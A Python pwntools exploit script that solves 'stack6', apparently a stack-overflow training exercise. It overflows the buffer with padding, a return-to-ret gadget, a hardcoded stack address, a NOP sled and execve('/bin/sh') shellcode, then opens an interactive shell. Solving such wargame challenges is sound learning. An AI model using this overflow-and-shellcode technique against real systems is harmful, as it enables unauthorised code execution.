from pwn import *

context.log_level = 'debug'

f = 'stack6'
p = process('../problems/' + f)
b = ELF('../problems/' + f)

padding = 'A'*80
ret_to_ret = p32(0x0804833e)  # rop to ret
ret = p32(0xffffd250)
nop = '\x90'*200
shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73" + \
             "\x68\x68\x2f\x62\x69\x6e\x89" + \
             "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
             "\xcd\x80\x31\xc0\x40\xcd\x80"

payload = padding + ret_to_ret + ret + nop + shellcode

p.sendline(payload)

p.recv()

p.interactive()
